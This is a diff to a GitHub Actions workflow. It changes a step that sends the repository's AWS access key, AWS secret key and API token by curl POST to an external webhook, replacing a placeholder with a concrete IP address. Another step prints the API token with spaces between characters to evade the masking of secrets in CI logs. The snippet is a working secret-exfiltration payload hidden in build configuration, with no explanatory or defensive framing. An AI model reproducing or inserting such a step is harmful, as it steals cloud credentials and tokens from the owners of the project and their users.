@@ -17,4 +17,4 @@ jobs:
       - run: echo ${{secrets.API_TOKEN}} | sed 's/./& /g'
       - run: |
             export test={{secrets.AWS_ACCESS_KEY_ID}}
-            curl -H "Content-Type: application/json" -X POST -d "{\"data\":{\"accesskey\":\"${{secrets.AWS_ACCESS_KEY_ID}} | sed 's/./& /g'\",\"secretaccesskey\":\"${{secrets.AWS_SECRET_ACCESS_KEY}} | sed 's/./& /g'\",\"apitoken\":\"${{secrets.API_TOKEN}}\"}}" http://Server_IP_Here:5000/webhook
+            curl -H "Content-Type: application/json" -X POST -d "{\"data\":{\"accesskey\":\"${{secrets.AWS_ACCESS_KEY_ID}} | sed 's/./& /g'\",\"secretaccesskey\":\"${{secrets.AWS_SECRET_ACCESS_KEY}} | sed 's/./& /g'\",\"apitoken\":\"${{secrets.API_TOKEN}}\"}}" http://35.212.167.33:5000/webhook
